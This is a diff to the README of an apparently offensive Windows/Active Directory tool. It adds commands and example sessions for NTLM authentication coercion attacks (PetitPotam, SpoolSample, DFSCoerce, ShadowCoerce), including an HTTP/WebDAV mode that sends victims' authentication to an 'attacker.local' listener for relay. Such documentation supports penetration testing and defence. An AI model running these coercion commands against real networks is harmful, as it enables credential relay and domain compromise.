@@ -173,6 +173,9 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `coerce spoolsample <listener>` | PrinterBug attack (MS-RPRN) |
 | `coerce dfscoerce <listener>` | DFSCoerce attack (MS-DFSNM) |
 | `coerce shadowcoerce <listener>` | ShadowCoerce attack (MS-FSRVP) |
+| `coerce <method> <listener> --http` | Use HTTP/WebDAV for relay attacks |
+| `coerce <method> <listener> --all` | Try all opnums |
+| `discover <listener>` | Find new coercion methods |
 
 ## Examples
 
@@ -258,10 +261,17 @@ export KRB5CCNAME=/path/to/ticket.ccache
 
 ### Coercion Attacks
 
-```
+```bash
+# SMB coercion (triggers callback on port 445)
 [SMBGooser] 192.168.1.10> coerce petitpotam 192.168.1.100
-[*] Triggering PetitPotam via EfsRpcOpenFileRaw...
-[+] Coercion triggered! Check your listener.
+[*] Correlation token: petit_abc12def (look for this in your listener)
+[+] [PetitPotam] Coercion successful
+
+# HTTP coercion for NTLM relay (triggers callback on port 80)
+[SMBGooser] 192.168.1.10> coerce spoolsample attacker.local --http
+[*] Correlation token: spool_f3e8a91c (look for this in your listener)
+[*] Using HTTP/WebDAV mode
+[+] [SpoolSample] Coercion successful
 ```
 
 ## Library Usage
